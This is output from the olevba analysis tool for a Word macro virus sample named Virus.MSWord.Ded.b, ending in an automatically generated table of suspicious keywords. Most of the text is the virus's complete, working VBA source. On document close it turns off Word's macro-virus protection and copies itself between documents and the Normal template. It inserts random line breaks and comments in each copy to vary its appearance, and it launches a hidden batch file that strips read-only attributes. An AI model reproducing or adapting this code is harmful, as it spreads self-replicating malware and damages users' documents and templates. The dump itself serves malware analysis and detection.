olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.b-1d2ed77c8d527ec84722ae0f34fe5d5c64d41001
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.b-1d2ed77c8d527ec84722ae0f34fe5d5c64d41001 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 _
Private Sub Document_Close()

          On Error GoTo skam
'5,350452
 _
        Options.VirusProtection = False

 _
   SWL

 _
    ABS99

skam:
'10,00522
 _
        End Sub

 _
      Private Sub SWL()

 _
  If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

  For i _
= 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

       d _
= NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 _
     While Mid(d, Len(d) - 1, 2) = " _"

 _
  i = i + 1

 _
         d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
          Wend

         d _
= e(d)

 _
        ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
  End If

 _
    Next i

       ActiveDocument.SaveAs AddToRecentFiles:=False
'3,095061
 _
 End If

 _
    End Sub

 _
   Private Sub ABS99()

 _
    If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

 _
f (NormalTemplate.FullName)

 _
     For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

 _
  d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
     If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

 _
           While Mid(d, Len(d) - 1, 2) = " _"

 _
  i = i + 1

 _
       d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)

 _
   Wend

 _
       d = e(d)

 _
            NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d

 _
End If

 _
         Next i

 _
      NormalTemplate.Save

      End _
If

 _
     End Sub

 _
       Private Function e(aString) As String

       For i = _
1 To Len(aString) - 1

 _
  While Mid(aString, i, 2) = " "

 _
      aString = Left(aString, i) & Right(aString, Len(aString) - i - 1)

 _
            Wend

               If _
Mid(aString, i, 1) = "." Then

 _
    If Not Mid(aString, i - 1, 1) = Chr$(34) And Not Mid(aString, i + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

 _
       If Not Mid(aString, i + 1, 1) = Chr$(34) Then

 _
    e = Left(aString, i - 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - i)

 _
          For j = 1 To Int(15 * Rnd)

 _
       e = " " & e

 _
 Next j

              Exit Function
'95,41579
 _
  End If

             End If
'64,30468
 _
           Else

 _
         If Mid(aString, i, 1) = " " And Int(3 * Rnd) = 1 And i > 1 Then

 _
           If Not Mid(aString, i + 1, 1) = Chr$(34) And Not Mid(aString, i - 1, 1) = Chr$(34) Then

 _
  e = Left(aString, i - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - i)

       For j = 1 _
To Int(15 * Rnd)

          e = " " & e
'98,42532
 _
          Next j

 _
       Exit Function

 _
            End If

 _
      End If

 _
          End If

 _
           Next i

 _
    e = aString & Chr$(13) & "'" & (100 * Rnd)

 _
           Count = Int(15 * Rnd)

 _
          For j = 1 To Count

 _
    e = " " & e

 _
    Next j

 _
        End Function

 _
Private Sub f(fName)

 _
      If GetAttr(fName) And vbReadOnly Then

 _
      Open Dir(fName) & ".bat" For Append As #1

 _
            Print #1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

 _
       Print #1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

 _
     Close #1

 _
         shellResult = Shell(Dir(fName) & ".bat", vbHide)

 _
    End If

 _
         End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

